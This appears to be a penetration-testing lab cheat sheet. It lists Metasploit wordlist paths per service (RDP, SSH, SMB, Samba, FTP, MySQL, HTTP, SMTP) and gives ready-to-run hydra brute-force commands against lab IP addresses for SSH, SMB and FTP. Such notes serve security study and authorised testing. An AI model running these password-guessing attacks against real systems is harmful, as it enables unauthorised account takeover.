**RDP**

USER /usr/share/metasploit-framework/data/wordlists/common_users.txt

PASSWORD /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

………………………………………………………………………………..

**SSH**

USER /usr/share/metasploit-framework/data/wordlists/common_users.txt

PASSWORD /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

openssh 7.1

```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.161 ssh
```

………………………………………………………………………………..

**SMB**

User administrator

Password /usr/share/wordlists/metasploit/unix_passwords.txt

USER /usr/share/metasploit-framework/data/wordlists/common_users.txt

PASSWORD /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

Windows server

```
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
```

………………………………………………………………………………..

**SAMBA ( Linux)**

User root

PASSWORD /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

………………………………………………………………………………..

**FTP**

USER /usr/share/metasploit-framework/data/wordlists/common_users.txt

Password /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

**Microsoft IIS FTP**

User /usr/share/wordlists/metasploit/unix_users.txt

Password /usr/share/wordlists/metasploit/unix_passwords.txt

……………………………………………………………………………….

VSftpd

```
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.17.5 ftp
```

………………………………………………………………………………

**MYSQL**

username root

Directory /usr/share/metasploit-framework/data/wordlists/directory.txt

Sensitive Files /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt

Password File /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

……………………………………………………………………………….

**HTTP Login bruteforce ( Apache )**

auxiliary/scanner/http/http_login

USER /usr/share/metasploit-framework/data/wordlists/unix_users.txt

PASSWORD /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

……………………………………………………………………………….

**SMTP**

username /usr/share/metasploit-framework/data/wordlists/unix_users.txt

……………………………………………………………………………………………….